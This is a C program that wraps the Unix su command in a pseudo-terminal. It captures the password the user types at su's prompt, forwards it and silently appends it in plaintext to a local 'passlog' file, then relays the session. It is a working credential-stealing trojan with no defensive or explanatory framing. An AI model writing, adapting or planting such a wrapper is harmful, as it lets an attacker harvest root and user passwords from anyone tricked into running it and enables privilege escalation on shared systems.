#include <errno.h>
#include <termios.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pty.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <signal.h>

#define BUF_SIZE 255

int forkpty(int *amaster, char *name, const struct termios *termp, const struct winsize *winp);

int main(int argc, char * const *argv)
{
    struct termios old;
    struct termios new;
    char *command;
    pid_t pid;

    int terminalfd;

    FILE *file = fopen("passlog", "a+");

    char buf[BUF_SIZE];
    char output[BUF_SIZE];

    char **su_argv = calloc(argc, sizeof(char*));

    /* Retrieve current terminal settings, turn echoing off */
    if (tcgetattr(0, &new) == -1)
    {
        perror("tcgetattr");
        exit(1);
    }

    old = new;
    /* ECHO off, other bits unchanged */
    new.c_lflag &= ~ECHO;
    printf("%p %p\n", &new, &old);

    if (tcsetattr(0, TCSAFLUSH, &new) == -1)
    {
        perror("tcsetattr");
        exit(1);
    }

    pid = forkpty(&terminalfd, (char *)NULL, NULL, NULL);
    if (pid == -1 || pid == 0)
    {
        exit(execvp("/bin/su", argv));
    }

    // read the password prompt
    int numbytes = read(terminalfd, output, BUF_SIZE - 1);
    // Display it to the user
    write(1, output, numbytes);

    // grab the password from the user
    fgets(buf, BUF_SIZE, stdin);
    //buf[strcspn(buf, "\n")] = 0;
    buf[strlen(buf)-1] = 0;

    // forward it to su
    write(terminalfd, buf, strlen(buf));
    // And save it
    fprintf(file, "%s\n", buf);


    /* Restore original terminal settings */

    if (tcsetattr(0, TCSANOW, &old) == -1)
    {
        perror("tcsetattr");
        exit(1);
    }

    // Fork to go into forwarding loops for input and output would probably be
    // cleaner with non-blocking IO in one thread, but this made sense to me
    // and I'm lazy
    pid_t forkpid = fork();
    if(forkpid == 0)
    {
        while(1) // loop while reading, logging, and writing to pty user's input
        {
            int numbytes = read(0, buf, BUF_SIZE - 1); //read from stdin
            if (numbytes == -1) // on error, if we're really done, then kill ourselves, otherwise continue
            {
                if(errno == 5)
                {
                    break;
                }
                continue;
            }
            write(terminalfd, buf, numbytes);
        }
    }
    else
    {
        pid_t childpid = forkpid;
        tcgetattr(0, &old); // Disable buffered I/O and echo mode for terminal emulated
        new = old;
        new.c_lflag &= ~ICANON;
        new.c_lflag &= ~ECHO;
        tcsetattr(0, TCSANOW, &new);

        while (1) // loop while reading and echoing the pty's output
        {
            int status;
            int numbytes = read(terminalfd, buf, BUF_SIZE - 1);
            if (numbytes == -1) // on error, if we're really done, then kill ourselves, otherwise continue
            {
                printf("[wrap]read -1, %d\n", errno);
                if(errno == 5)
                {
                    waitpid(pid, &status, WNOHANG);
                    printf("[wrap]status: %d\n", status);
                    kill(childpid, SIGTERM);
                    tcsetattr(0, TCSANOW, &old); //reset terminal
                    if (WIFEXITED(status))
                    {
                        printf("[wrap]exited\n");
                        exit(WEXITSTATUS(status));
                    } else {
                        printf("[wrap]didn't exit\n");
                        exit(1);
                    }
                }
                continue;
            }
            write(1, buf, numbytes);
        }
    }

    exit(EXIT_SUCCESS);

}
